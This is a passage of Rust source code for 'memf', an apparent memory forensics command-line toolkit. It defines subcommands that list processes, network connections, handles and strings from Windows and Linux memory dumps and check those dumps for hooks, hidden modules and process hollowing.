#![deny(unsafe_code)]

mod archive;
mod os_detect;

use anyhow::{Context, Result};
use clap::{Parser, Subcommand};
use comfy_table::{presets::UTF8_FULL_CONDENSED, Table};
use std::fmt::Write as _;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use memf_core::object_reader::ObjectReader;
use memf_core::vas::{TranslationMode, VirtualAddressSpace};
use memf_format::PhysicalMemoryProvider;
use os_detect::{AnalysisContext, OsProfile};

#[derive(Parser)]
#[command(
    name = "memf",
    version,
    about = "Memory forensics toolkit",
    long_about = "Memory forensics toolkit — analyze physical memory dumps from Windows, Linux, and VMware.\n\n\
        Supported dump formats:\n  \
        LiME (.lime)          Linux (LiME kernel module)\n  \
        AVML v2               Linux (Azure AVML)\n  \
        ELF Core              Linux (QEMU, gcore)\n  \
        Windows Crash Dump    Windows (.dmp, DumpIt, WinDbg)\n  \
        Hiberfil.sys          Windows (hibernate / fast startup)\n  \
        VMware State          Any (.vmss, .vmsn)\n  \
        kdump / diskdump      Linux (makedumpfile)\n  \
        Raw / flat            Any (fallback)\n\n\
        Format is auto-detected from file headers. Symbol files (ISF JSON or PDB)\n\
        are required for process, module, and network analysis.",
    after_help = "Examples:\n  \
        memf info memdump.dmp\n  \
        memf ps memdump.dmp --symbols ntkrnlmp.json\n  \
        memf ps memdump.dmp --symbols ntkrnlmp.json --threads --output json\n  \
        memf ps memdump.dmp --symbols ntkrnlmp.json --pid 4\n  \
        memf ps memdump.dmp --symbols ntkrnlmp.json --tree\n  \
        memf ps memdump.dmp --symbols ntkrnlmp.json --masquerade\n  \
        memf ps memdump.dmp --symbols ntkrnlmp.json --dlls --pid 1234\n  \
        memf ps memdump.lime --symbols linux.json --maps\n  \
        memf ps memdump.lime --symbols linux.json --envvars\n  \
        memf ps memdump.dmp --symbols ntkrnlmp.json --cmdline\n  \
        memf ps memdump.dmp --symbols ntkrnlmp.json --vad\n  \
        memf ps memdump.dmp --symbols ntkrnlmp.json --privileges\n  \
        memf ps memdump.lime --symbols linux.json --elfinfo\n  \
        memf ps memdump.lime --symbols linux.json --bash-history\n  \
        memf sys memdump.dmp --symbols ntkrnlmp.json\n  \
        memf sys memdump.lime --symbols linux.json --mounts\n  \
        memf net memdump.dmp --symbols ntkrnlmp.json --output csv\n  \
        memf check memdump.lime --symbols linux.json --syscalls\n  \
        memf check memdump.lime --symbols linux.json --hooks\n  \
        memf check memdump.lime --symbols linux.json --malfind\n  \
        memf check memdump.dmp --symbols ntkrnlmp.json --ssdt\n  \
        memf check memdump.dmp --symbols ntkrnlmp.json --callbacks\n  \
        memf handles memdump.lime --symbols linux.json\n  \
        memf strings memdump.dmp --rules ./yara-rules/\n  \
        memf strings --from-file extracted.txt --min-length 8"
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

/// Parse a hex address string for Clap's value_parser.
fn parse_cr3(s: &str) -> Result<u64, String> {
    os_detect::parse_hex_addr(s).map_err(|e| e.to_string())
}

#[derive(Subcommand)]
enum Commands {
    /// Show dump format, physical ranges, and basic metadata.
    Info {
        /// Path to the memory dump file.
        dump: PathBuf,
    },
    /// List processes and per-process attributes from a memory dump.
    #[command(alias = "process")]
    Ps {
        /// Path to the memory dump file.
        dump: PathBuf,

        /// Path to ISF JSON symbol file or directory.
        #[arg(long)]
        symbols: Option<PathBuf>,

        /// Output format: table, json, csv.
        #[arg(long, default_value = "table")]
        output: OutputFormat,

        /// Optional kernel page table root (CR3) physical address (hex).
        #[arg(long, value_parser = parse_cr3)]
        cr3: Option<u64>,

        /// Also enumerate threads for each process.
        #[arg(long)]
        threads: bool,

        /// Filter by process ID.
        #[arg(long)]
        pid: Option<u64>,

        /// Display processes as a tree.
        #[arg(long)]
        tree: bool,

        /// Check for PEB masquerade (Windows only).
        #[arg(long)]
        masquerade: bool,

        /// List loaded DLLs (Windows). Shows DLLs for a single process
        /// when --pid is given, or for all processes when --pid is omitted.
        #[arg(long)]
        dlls: bool,

        /// List process memory maps / VMAs (Linux only).
        #[arg(long)]
        maps: bool,

        /// Show environment variables for each process.
        #[arg(long)]
        envvars: bool,

        /// Extract process command lines.
        #[arg(long)]
        cmdline: bool,

        /// List Virtual Address Descriptors (Windows only).
        #[arg(long)]
        vad: bool,

        /// Show process token privileges (Windows only).
        #[arg(long)]
        privileges: bool,

        /// Extract ELF headers from process memory (Linux only).
        #[arg(long)]
        elfinfo: bool,

        /// Recover bash command history from process heaps (Linux only).
        #[arg(long, name = "bash-history")]
        bash_history: bool,

        /// Enable all platform-appropriate process sub-flags.
        #[arg(long)]
        all: bool,

        /// Sort processes by field (pid, ppid, name, time). Default: pid.
        #[arg(long, default_value = "pid")]
        sort: PsSortField,

        /// User-provided boot time (Unix epoch seconds, e.g. from UAC /proc/stat btime).
        /// Cross-referenced with kernel timekeeper for inconsistency detection.
        #[arg(long)]
        btime: Option<i64>,
    },
    /// List kernel modules/drivers and system-level artifacts.
    #[command(name = "sys", alias = "system")]
    Sys {
        /// Path to the memory dump file.
        dump: PathBuf,

        /// Path to ISF JSON symbol file or directory.
        #[arg(long)]
        symbols: Option<PathBuf>,

        /// Output format: table, json, csv.
        #[arg(long, default_value = "table")]
        output: OutputFormat,

        /// Optional kernel page table root (CR3) physical address (hex).
        #[arg(long, value_parser = parse_cr3)]
        cr3: Option<u64>,

        /// Also list mounted filesystems (Linux only).
        #[arg(long)]
        mounts: bool,
    },
    /// List network connections from a memory dump.
    #[command(alias = "network")]
    Net {
        /// Path to the memory dump file.
        dump: PathBuf,

        /// Path to ISF JSON symbol file or directory.
        #[arg(long)]
        symbols: Option<PathBuf>,

        /// Output format: table, json, csv.
        #[arg(long, default_value = "table")]
        output: OutputFormat,

        /// Optional kernel page table root (CR3) physical address (hex).
        #[arg(long, value_parser = parse_cr3)]
        cr3: Option<u64>,

        /// Filter by process ID.
        #[arg(long)]
        pid: Option<u64>,
    },
    /// Run integrity and tampering detection checks.
    Check {
        /// Path to the memory dump file.
        dump: PathBuf,

        /// Path to ISF JSON symbol file or directory.
        #[arg(long)]
        symbols: Option<PathBuf>,

        /// Output format: table, json, csv.
        #[arg(long, default_value = "table")]
        output: OutputFormat,

        /// Optional kernel page table root (CR3) physical address (hex).
        #[arg(long, value_parser = parse_cr3)]
        cr3: Option<u64>,

        /// Check syscall table for hooks (Linux only).
        #[arg(long)]
        syscalls: bool,

        /// Check kernel functions for inline hooks (Linux only).
        #[arg(long)]
        hooks: bool,

        /// Check driver IRP dispatch table for hooks (Windows only).
        #[arg(long)]
        irp: bool,

        /// Check SSDT for hooked system services (Windows only).
        #[arg(long)]
        ssdt: bool,

        /// Enumerate kernel notification callbacks (Windows only).
        #[arg(long)]
        callbacks: bool,

        /// Detect suspicious memory regions (anonymous RWX pages).
        #[arg(long)]
        malfind: bool,

        /// Cross-view hidden process detection (Linux only).
        #[arg(long)]
        psxview: bool,

        /// Check TTY driver operations for hooks (Linux only).
        #[arg(long)]
        tty: bool,

        /// Detect hidden kernel modules (Linux only).
        #[arg(long)]
        modules: bool,

        /// Cross-reference PEB LDR module lists for DLL hiding (Windows only).
        #[arg(long)]
        ldrmodules: bool,

        /// Detect process hollowing via PE header validation (Windows only).
        #[arg(long)]
        hollowing: bool,

        /// Run all platform-appropriate checks.
        #[arg(long)]
        all: bool,

        /// Filter process-specific checks (malfind, ldrmodules, hollowing) by PID.
        #[arg(long)]
        pid: Option<u64>,
    },
    /// List open handles (Windows) or file descriptors (Linux).
    Handles {
        /// Path to the memory dump file.
        dump: PathBuf,

        /// Path to ISF JSON symbol file or directory.
        #[arg(long)]
        symbols: Option<PathBuf>,

        /// Output format: table, json, csv.
        #[arg(long, default_value = "table")]
        output: OutputFormat,

        /// Optional kernel page table root (CR3) physical address (hex).
        #[arg(long, value_parser = parse_cr3)]
        cr3: Option<u64>,

        /// Filter by process ID.
        #[arg(long)]
        pid: Option<u64>,
    },
    /// Extract and classify strings from a memory dump or strings file.
    Strings {
        /// Path to the memory dump file (mutually exclusive with --from-file).
        dump: Option<PathBuf>,

        /// Load pre-extracted strings from a file instead of a dump.
        #[arg(long)]
        from_file: Option<PathBuf>,

        /// Minimum string length (default: 4).
        #[arg(long, default_value = "4")]
        min_length: usize,

        /// Output format: table, json, csv.
        #[arg(long, default_value = "table")]
        output: OutputFormat,

        /// Path to YARA rules directory.
        #[arg(long)]
        rules: Option<PathBuf>,
    },
    /// Build a unified timeline of all timestamped events from a memory dump.
    Timeline {
        /// Path to the memory dump file.
        dump: PathBuf,

        /// Path to ISF JSON symbol file or directory.
        #[arg(long)]
        symbols: Option<PathBuf>,

        /// Output format: table, json, csv.
        #[arg(long, default_value = "table")]
        output: OutputFormat,

        /// Optional kernel page table root (CR3) physical address (hex).
        #[arg(long, value_parser = parse_cr3)]
        cr3: Option<u64>,

        /// User-provided boot time (Unix epoch seconds) for Linux dumps.
        #[arg(long)]
        btime: Option<i64>,

        /// Output in Sleuthkit bodyfile format (for mactime/Plaso ingestion).
        #[arg(long)]
        bodyfile: bool,
    },
    /// Dump a process's virtual memory to a file.
    Procdump {
        /// Path to the memory dump file.
        dump: PathBuf,
        /// Path to ISF JSON symbol file or directory.
        #[arg(long)]
        symbols: Option<PathBuf>,
        /// Optional kernel page table root (CR3) physical address (hex).
        #[arg(long, value_parser = parse_cr3)]
        cr3: Option<u64>,
        /// Process ID to dump.
        #[arg(long)]
        pid: u64,
        /// Output directory for dump files (default: current directory).
        #[arg(long, default_value = ".")]
        output_dir: PathBuf,
    },
}

#[derive(Clone, Copy, clap::ValueEnum)]
enum OutputFormat {
    Table,
    Json,
    Csv,
}

/// Sort field for the `ps` subcommand.
#[derive(Clone, Copy, Default, clap::ValueEnum)]
enum PsSortField {
    /// Sort by process ID (default).
    #[default]
    Pid,
    /// Sort by parent process ID.
    Ppid,
    /// Sort by process name.
    Name,
    /// Sort by creation time (Windows only; falls back to PID on Linux).
    Time,
}

#[allow(clippy::too_many_lines)]
fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Info { dump } => {
            let resolved = archive::resolve_dump(&dump)?;
            cmd_info(resolved.path(), resolved.is_extracted())
        }
        Commands::Ps {
            dump,
            symbols,
            output,
            cr3,
            threads,
            pid,
            tree,
            masquerade,
            dlls,
            maps,
            envvars,
            cmdline,
            vad,
            privileges,
            elfinfo,
            bash_history,
            all,
            sort,
            btime,
        } => {
            let resolved = archive::resolve_dump(&dump)?;
            cmd_ps(
                resolved.path(),
                symbols.as_deref(),
                output,
                cr3,
                threads,
                pid,
                tree,
                masquerade,
                dlls,
                maps,
                envvars,
                cmdline,
                vad,
                privileges,
                elfinfo,
                bash_history,
                all,
                sort,
                btime,
                resolved.is_extracted(),
            )
        }
        Commands::Sys {
            dump,
            symbols,
            output,
            cr3,
            mounts,
        } => {
            let resolved = archive::resolve_dump(&dump)?;
            cmd_system(
                resolved.path(),
                symbols.as_deref(),
                output,
                cr3,
                mounts,
                resolved.is_extracted(),
            )
        }
        Commands::Net {
            dump,
            symbols,
            output,
            cr3,
            pid,
        } => {
            let resolved = archive::resolve_dump(&dump)?;
            cmd_net(
                resolved.path(),
                symbols.as_deref(),
                output,
                cr3,
                pid,
                resolved.is_extracted(),
            )
        }
        Commands::Check {
            dump,
            symbols,
            output,
            cr3,
            syscalls,
            hooks,
            irp,
            ssdt,
            callbacks,
            malfind,
            psxview,
            tty,
            modules,
            ldrmodules,
            hollowing,
            all,
            pid,
        } => {
            let resolved = archive::resolve_dump(&dump)?;
            cmd_check(
                resolved.path(),
                symbols.as_deref(),
                output,
                cr3,
                syscalls,
                hooks,
                irp,
                ssdt,
                callbacks,
                malfind,
                psxview,
                tty,
                modules,
                ldrmodules,
                hollowing,
                all,
                pid,
                resolved.is_extracted(),
            )
        }
        Commands::Handles {
            dump,
            symbols,
            output,
            cr3,
            pid,
        } => {
            let resolved = archive::resolve_dump(&dump)?;
            cmd_handles(
                resolved.path(),
                symbols.as_deref(),
                output,
                cr3,
                pid,
                resolved.is_extracted(),
            )
        }
        Commands::Strings {
            dump,
            from_file,
            min_length,
            output,
            rules,
        } => {
            let resolved = dump.as_deref().map(archive::resolve_dump).transpose()?;
            let raw_fallback = resolved
                .as_ref()
                .is_some_and(archive::ResolvedDump::is_extracted);
            cmd_strings(
                resolved.as_ref().map(archive::ResolvedDump::path),
                from_file,
                min_length,
                output,
                rules,
                raw_fallback,
            )
        }
        Commands::Timeline {
            dump,
            symbols,
            output,
            cr3,
            btime,
            bodyfile,
        } => {
            let resolved = archive::resolve_dump(&dump)?;
            cmd_timeline(
                resolved.path(),
                symbols.as_deref(),
                output,
                cr3,
                btime,
                bodyfile,
                resolved.is_extracted(),
            )
        }
        Commands::Procdump {
            dump,
            symbols,
            cr3,
            pid,
            output_dir,
        } => {
            let resolved = archive::resolve_dump(&dump)?;
            cmd_procdump(resolved.path(), symbols.as_deref(), cr3, pid, &output_dir)
        }
    }
}

// ---------------------------------------------------------------------------
// Format detection
// ---------------------------------------------------------------------------

/// Open a dump using raw-format fallback when extracted from an archive.
fn open_dump_for(dump: &Path, raw_fallback: bool) -> Result<Box<dyn PhysicalMemoryProvider>> {
    let result = if raw_fallback {
        memf_format::open_dump_with_raw_fallback(dump)
    } else {
        memf_format::open_dump(dump)
    };
    result.with_context(|| format!("failed to open {}", dump.display()))
}

// ---------------------------------------------------------------------------
// Symbol loading
// ---------------------------------------------------------------------------

fn load_symbols(path: Option<&Path>) -> Result<Box<dyn memf_symbols::SymbolResolver>> {
    // If path is a file with .pdb extension, use PdbResolver
    if let Some(p) = path {
        if p.is_file() {
            if let Some(ext) = p.extension() {
                if ext.eq_ignore_ascii_case("pdb") {
                    let resolver = memf_symbols::pdb_resolver::PdbResolver::from_path(p)
                        .with_context(|| format!("failed to load PDB from {}", p.display()))?;
                    return Ok(Box::new(resolver));
                }
            }
        }
    }
    // Otherwise, existing ISF logic
    let files = memf_symbols::isf::discover_isf_files(path);
    if files.is_empty() {
        anyhow::bail!(
            "no symbol files found. Provide --symbols <path> or set $MEMF_SYMBOLS_PATH.\n\
             Hint: run `memf info <dump>` first to inspect the dump format and metadata."
        );
    }
    let resolver = memf_symbols::isf::IsfResolver::from_path(&files[0])
        .with_context(|| format!("failed to load symbols from {}", files[0].display()))?;
    Ok(Box::new(resolver))
}

// ---------------------------------------------------------------------------
// Analysis setup helper
// ---------------------------------------------------------------------------

fn setup_analysis(
    dump: &Path,
    symbols_path: Option<&Path>,
    cr3_override: Option<u64>,
    raw_fallback: bool,
) -> Result<(
    AnalysisContext,
    ObjectReader<Arc<dyn PhysicalMemoryProvider>>,
)> {
    let provider = open_dump_for(dump, raw_fallback)?;
    let resolver = if symbols_path.is_some() {
        load_symbols(symbols_path)?
    } else {
        // No explicit symbols path — try auto-download from symbol server.
        match try_auto_download_symbols(provider.as_ref()) {
            Ok(r) => r,
            Err(_) => load_symbols(symbols_path)?, // falls through to helpful error
        }
    };
    let metadata = provider.metadata();

    let ctx = if let Some(cr3) = cr3_override {
        let os = os_detect::detect_os(metadata.as_ref(), resolver.as_ref())?;
        AnalysisContext {
            os,
            cr3,
            kaslr_offset: 0,
            ps_active_process_head: metadata.as_ref().and_then(|m| m.ps_active_process_head),
            ps_loaded_module_list: metadata.as_ref().and_then(|m| m.ps_loaded_module_list),
        }
    } else {
        os_detect::build_analysis_context(metadata.as_ref(), resolver.as_ref(), provider.as_ref())?
    };

    eprintln!("OS: {}, CR3: {:#x}", ctx.os, ctx.cr3);

    // Wrap in Arc so per-process readers can cheaply share the physical provider.
    let provider: Arc<dyn PhysicalMemoryProvider> = Arc::from(provider);
    let vas = VirtualAddressSpace::new(provider, ctx.cr3, TranslationMode::X86_64FourLevel);
    let reader = ObjectReader::new(vas, resolver);

    Ok((ctx, reader))
}

// ---------------------------------------------------------------------------
// cmd_info
// ---------------------------------------------------------------------------

#[allow(clippy::cast_precision_loss)]
fn cmd_info(dump: &Path, raw_fallback: bool) -> Result<()> {
    let provider = open_dump_for(dump, raw_fallback)?;

    println!("Format:     {}", provider.format_name());
    println!(
        "Total size: {} bytes ({:.2} GB)",
        provider.total_size(),
        provider.total_size() as f64 / (1024.0 * 1024.0 * 1024.0)
    );
    println!("Ranges:     {}", provider.ranges().len());

    // Show metadata if available
    if let Some(meta) = provider.metadata() {
        println!();
        if let Some(dtype) = &meta.dump_type {
            println!("Type:       {dtype}");
        }
        if let Some(mt) = meta.machine_type {
            println!("Machine:    {mt:?}");
        }
        if let Some(cr3) = meta.cr3 {
            println!("CR3:        {cr3:#014x}");
        }
        if let Some(head) = meta.ps_active_process_head {
            println!("PsActiveProcessHead: {head:#018x}");
        }
        if let Some(mods) = meta.ps_loaded_module_list {
            println!("PsLoadedModuleList:  {mods:#018x}");
        }
        if let Some((major, minor)) = meta.os_version {
            println!("OS Version: {major}.{minor}");
        }
        if let Some(n) = meta.num_processors {
            println!("Processors: {n}");
        }
    }

    println!();

    let mut table = Table::new();
    table.load_preset(UTF8_FULL_CONDENSED);
    table.set_header(vec!["#", "Start", "End", "Size"]);

    for (i, range) in provider.ranges().iter().enumerate() {
        table.add_row(vec![
            format!("{i}"),
            format!("{:#014x}", range.start),
            format!("{:#014x}", range.end),
            format_size(range.len()),
        ]);
    }
    println!("{table}");

    Ok(())
}

// ---------------------------------------------------------------------------
// cmd_ps — processes and per-process attributes
// ---------------------------------------------------------------------------

#[allow(
    clippy::too_many_arguments,
    clippy::fn_params_excessive_bools,
    clippy::too_many_lines
)]
fn cmd_ps(
    dump: &Path,
    symbols_path: Option<&Path>,
    output: OutputFormat,
    cr3_override: Option<u64>,
    threads: bool,
    pid_filter: Option<u64>,
    tree: bool,
    masquerade: bool,
    dlls: bool,
    maps: bool,
    envvars: bool,
    cmdline: bool,
    vad: bool,
    privileges: bool,
    elfinfo: bool,
    bash_history: bool,
    all: bool,
    sort_field: PsSortField,
    btime: Option<i64>,
    raw_fallback: bool,
) -> Result<()> {
    let (ctx, reader) = setup_analysis(dump, symbols_path, cr3_override, raw_fallback)?;
    match ctx.os {
        OsProfile::Linux => {
            // Expand --all into platform-appropriate flags (excludes tree, pid, dlls)
            let threads = threads || all;
            let cmdline = cmdline || all;
            let maps = maps || all;
            let envvars = envvars || all;
            let elfinfo = elfinfo || all;
            let bash_history = bash_history || all;

            if masquerade {
                anyhow::bail!("--masquerade is only supported for Windows dumps");
            }
            if dlls {
                anyhow::bail!("--dlls is only supported for Windows dumps");
            }
            if vad {
                anyhow::bail!("--vad is only supported for Windows dumps");
            }
            if privileges {
                anyhow::bail!("--privileges is only supported for Windows dumps");
            }
            let mut procs = memf_linux::process::walk_processes(&reader)
                .context("failed to walk Linux processes")?;

            // Collect boot time estimates from all available sources.
            let mut estimates = Vec::new();
            match memf_linux::boot_time::extract_boot_time(&reader) {
                Ok(est) => estimates.push(est),
                Err(e) => {
                    eprintln!("warning: could not extract boot time from kernel timekeeper: {e}");
                }
            }
            if let Some(epoch) = btime {
                estimates.push(memf_linux::BootTimeEstimate {
                    source: memf_linux::BootTimeSource::UserProvided,
                    boot_epoch_secs: epoch,
                });
            }
            let boot_info = memf_linux::BootTimeInfo::from_estimates(estimates);
            if boot_info.inconsistent {
                eprintln!(
                    "WARNING: boot time sources disagree by {}s (>{BOOT_TIME_DRIFT_WARN}s) — possible clock manipulation",
                    boot_info.max_drift_secs,
                );
                for est in &boot_info.estimates {
                    eprintln!("  {} => {}", est.source, est.boot_epoch_secs);
                }
            }
            if let Some(epoch) = boot_info.best_estimate {
                eprintln!("Boot time: {}", format_epoch(epoch));
            }

            match sort_field {
                PsSortField::Pid => procs.sort_by_key(|p| p.pid),
                PsSortField::Ppid => procs.sort_by_key(|p| p.ppid),
                PsSortField::Name => {
                    procs.sort_by(|a, b| a.comm.to_lowercase().cmp(&b.comm.to_lowercase()));
                }
                PsSortField::Time => procs.sort_by_key(|p| p.start_time),
            }

            if tree {
                let tree_entries = memf_linux::process::build_pstree(&procs);
                print_linux_pstree(&tree_entries, output, &boot_info);
            } else {
                print_linux_processes(&procs, output, &boot_info);
            }

            if threads {
                let mut all_threads = Vec::new();
                for proc in &procs {
                    if let Some(pid) = pid_filter {
                        if proc.pid != pid {
                            continue;
                        }
                    }
                    match memf_linux::thread::walk_threads(&reader, proc.vaddr, proc.pid) {
                        Ok(t) => all_threads.extend(t),
                        Err(e) => {
                            eprintln!("warning: failed to walk threads for PID {}: {e}", proc.pid);
                        }
                    }
                }
                println!();
                print_linux_threads(&all_threads, output);
            }

            if cmdline {
                let mut cmdlines = Vec::new();
                for proc in &procs {
                    if let Some(pid) = pid_filter {
                        if proc.pid != pid {
                            continue;
                        }
                    }
                    // skip kernel threads / unreadable
                    if let Ok(info) = memf_linux::cmdline::walk_process_cmdline(&reader, proc.vaddr)
                    {
                        cmdlines.push(info);
                    }
                }
                println!();
                print_linux_cmdlines(&cmdlines, output);
            }

            if maps {
                let vmas =
                    memf_linux::maps::walk_maps(&reader).context("failed to walk Linux VMAs")?;
                println!();
                print_vmas(&vmas, output);
            }
            if envvars {
                let vars = memf_linux::envvars::walk_envvars(&reader)
                    .context("failed to walk Linux environment variables")?;
                println!();
                print_envvars(&vars, output);
            }
            if elfinfo {
                let entries = memf_linux::elfinfo::walk_elfinfo(&reader)
                    .context("failed to extract ELF info")?;
                println!();
                print_elfinfo(&entries, output);
            }
            if bash_history {
                let entries = memf_linux::bash::walk_bash_history(&reader)
                    .context("failed to recover bash history")?;
                println!();
                print_bash_history(&entries, output);
            }
        }
        OsProfile::Windows => {
            // Expand --all into platform-appropriate flags (excludes tree, pid)
            let threads = threads || all;
            let masquerade = masquerade || all;
            let dlls = dlls || all;
            let envvars = envvars || all;
            let cmdline = cmdline || all;
            let vad = vad || all;
            let privileges = privileges || all;

            if maps {
                anyhow::bail!("--maps is only supported for Linux dumps");
            }
            if elfinfo {
                anyhow::bail!("--elfinfo is only supported for Linux dumps");
            }
            if bash_history {
                anyhow::bail!("--bash-history is only supported for Linux dumps");
            }
            let ps_head = ctx
                .ps_active_process_head
                .context("missing PsActiveProcessHead; provide via symbols or dump metadata")?;
            let mut procs = memf_windows::process::walk_processes(&reader, ps_head)
                .context("failed to walk Windows processes")?;

            match sort_field {
                PsSortField::Pid => procs.sort_by_key(|p| p.pid),
                PsSortField::Ppid => procs.sort_by_key(|p| p.ppid),
                PsSortField::Name => procs.sort_by(|a, b| {
                    a.image_name
                        .to_lowercase()
                        .cmp(&b.image_name.to_lowercase())
                }),
                PsSortField::Time => procs.sort_by_key(|p| p.create_time),
            }

            if tree {
                let tree_entries = memf_windows::process::build_pstree(&procs);
                print_pstree(&tree_entries, output);
            } else {
                print_windows_processes(&procs, output);
            }

            if threads {
                let mut all_threads = Vec::new();
                for proc in &procs {
                    if let Some(pid) = pid_filter {
                        if proc.pid != pid {
                            continue;
                        }
                    }
                    match memf_windows::thread::walk_threads(&reader, proc.vaddr, proc.pid) {
                        Ok(t) => all_threads.extend(t),
                        Err(e) => {
                            eprintln!("warning: failed to walk threads for PID {}: {e}", proc.pid);
                        }
                    }
                }
                println!();
                print_threads(&all_threads, output);
            }

            if masquerade {
                let masq_results = memf_windows::process::check_peb_masquerade(&reader, ps_head)
                    .context("failed to check PEB masquerade")?;
                println!();
                print_masquerade(&masq_results, output);
            }

            if dlls {
                println!();
                if let Some(pid) = pid_filter {
                    // Single-process mode: list DLLs for the specified PID.
                    let target = procs
                        .iter()
                        .find(|p| p.pid == pid)
                        .with_context(|| format!("process with PID {pid} not found"))?;
                    if target.peb_addr == 0 {
                        anyhow::bail!("process PID {pid} has no PEB (kernel process?)");
                    }
                    let dll_list = memf_windows::dll::walk_dlls(&reader, target.peb_addr)
                        .with_context(|| format!("failed to walk DLLs for PID {pid}"))?;
                    print_libs(None, &dll_list, output);
                } else {
                    // All-process mode: iterate every process with a valid PEB.
                    for proc in &procs {
                        if proc.peb_addr == 0 {
                            continue;
                        }
                        if let Ok(dll_list) = memf_windows::dll::walk_dlls(&reader, proc.peb_addr) {
                            if !dll_list.is_empty() {
                                print_libs(Some((proc.pid, &proc.image_name)), &dll_list, output);
                            }
                        }
                    }
                }
            }

            if envvars {
                let vars = memf_windows::envvars::walk_envvars(&reader, ps_head)
                    .context("failed to walk Windows environment variables")?;
                println!();
                print_windows_envvars(&vars, output);
            }

            if cmdline {
                let cmdlines = memf_windows::cmdline::walk_cmdlines(&reader, ps_head)
                    .context("failed to walk Windows command lines")?;
                println!();
                print_windows_cmdlines(&cmdlines, output);
            }

            if vad {
                let mut all_vads = Vec::new();
                for proc in &procs {
                    if let Ok(vads) = memf_windows::vad::walk_vad_tree(
                        &reader,
                        proc.vaddr,
                        proc.pid,
                        &proc.image_name,
                    ) {
                        all_vads.extend(vads);
                    }
                }
                println!();
                print_windows_vads(&all_vads, output);
            }

            if privileges {
                let tokens = memf_windows::token::walk_tokens(&reader, ps_head)
                    .context("failed to walk process tokens")?;
                println!();
                print_windows_privileges(&tokens, output);
            }
        }
        OsProfile::MacOs => anyhow::bail!("macOS process walking not yet supported"),
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// cmd_net — network connections
// ---------------------------------------------------------------------------

fn cmd_net(
    dump: &Path,
    symbols_path: Option<&Path>,
    output: OutputFormat,
    cr3_override: Option<u64>,
    pid_filter: Option<u64>,
    raw_fallback: bool,
) -> Result<()> {
    let (ctx, reader) = setup_analysis(dump, symbols_path, cr3_override, raw_fallback)?;
    match ctx.os {
        OsProfile::Linux => {
            let mut conns = memf_linux::network::walk_connections(&reader)
                .context("failed to walk Linux connections")?;
            if let Some(pid) = pid_filter {
                conns.retain(|c| c.pid == Some(pid));
                if conns.is_empty() {
                    eprintln!("warning: no connections found for PID {pid}");
                }
            }
            print_connections(&conns, output);
        }
        OsProfile::Windows => {
            // TCP hash table discovery requires tcpip.sys symbols.
            // TcpBTable: global pointer to the hash table array.
            // TcpBTableSize: global u32 holding the number of buckets.
            let tcp_table_sym = reader.symbols().symbol_address("TcpBTable").context(
                "missing 'TcpBTable' symbol; Windows TCP connection listing \
                     requires tcpip.sys symbols in the ISF file",
            )?;
            let ptr_bytes = reader
                .read_bytes(tcp_table_sym, 8)
                .context("failed to dereference TcpBTable pointer")?;
            let table_vaddr = u64::from_le_bytes(ptr_bytes[..8].try_into().expect("8 bytes"));

            let tcp_size_sym = reader
                .symbols()
                .symbol_address("TcpBTableSize")
                .context("missing 'TcpBTableSize' symbol")?;
            let size_bytes = reader
                .read_bytes(tcp_size_sym, 4)
                .context("failed to read TcpBTableSize")?;
            let bucket_count = u32::from_le_bytes(size_bytes[..4].try_into().expect("4 bytes"));

            let mut conns =
                memf_windows::network::walk_tcp_endpoints(&reader, table_vaddr, bucket_count)
                    .context("failed to walk Windows TCP endpoints")?;
            if let Some(pid) = pid_filter {
                conns.retain(|c| c.pid == pid);
                if conns.is_empty() {
                    eprintln!("warning: no connections found for PID {pid}");
                }
            }
            print_win_connections(&conns, output);
        }
        OsProfile::MacOs => anyhow::bail!("macOS network walking not yet supported"),
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// cmd_strings
// ---------------------------------------------------------------------------

fn cmd_strings(
    dump: Option<&Path>,
    from_file: Option<PathBuf>,
    min_length: usize,
    output: OutputFormat,
    rules: Option<PathBuf>,
    raw_fallback: bool,
) -> Result<()> {
    // Load strings from either a dump or a pre-extracted file
    let mut strings = if let Some(path) = from_file {
        memf_strings::from_file::from_strings_file(&path)
            .with_context(|| format!("failed to read strings file {}", path.display()))?
    } else if let Some(dump_path) = dump {
        let provider = open_dump_for(dump_path, raw_fallback)?;
        let config = memf_strings::extract::ExtractConfig {
            min_length,
            ascii: true,
            utf16le: true,
        };
        memf_strings::extract::extract_strings(provider.as_ref(), &config)
    } else {
        anyhow::bail!("provide either a dump file or --from-file");
    };

    // Classify with regex (always active via inventory)
    memf_strings::classify::classify_strings(&mut strings);

    // Optionally classify with YARA
    if let Some(rules_dir) = rules {
        let yara = memf_strings::yara_classifier::YaraClassifier::from_rules_dir(&rules_dir)
            .with_context(|| format!("failed to load YARA rules from {}", rules_dir.display()))?;
        for s in &mut strings {
            let matches = yara.scan_string(&s.value);
            s.categories.extend(matches);
        }
    }

    // Output
    match output {
        OutputFormat::Table => print_strings_table(&strings),
        OutputFormat::Json => print_strings_json(&strings)?,
        OutputFormat::Csv => print_strings_csv(&strings),
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Output formatters — Linux processes
// ---------------------------------------------------------------------------

/// Drift threshold (seconds) for boot time inconsistency warning.
const BOOT_TIME_DRIFT_WARN: i64 = 60;

/// Format a Unix epoch timestamp into a UTC datetime string.
fn format_epoch(epoch: i64) -> String {
    let abs_secs = epoch.unsigned_abs();
    let sec = abs_secs % 60;
    let min = (abs_secs / 60) % 60;
    let hour = (abs_secs / 3600) % 24;
    // Simple days-since-epoch to Y-M-D conversion.
    let days = i64::try_from(abs_secs / 86400).unwrap_or(i64::MAX);
    let (year, month, day) = days_to_ymd(if epoch < 0 { -days } else { days });
    format!("{year:04}-{month:02}-{day:02} {hour:02}:{min:02}:{sec:02} UTC")
}

/// Convert days since Unix epoch to (year, month, day).
fn days_to_ymd(days: i64) -> (i64, u32, u32) {
    // Algorithm from http://howardhinnant.github.io/date_algorithms.html
    let z = days + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    // doe is guaranteed non-negative by the era calculation.
    let doe = u32::try_from(z - era * 146_097).unwrap_or(0);
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146_096) / 365;
    let yr = i64::from(yoe) + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let day = doy - (153 * mp + 2) / 5 + 1;
    let month = if mp < 10 { mp + 3 } else { mp - 9 };
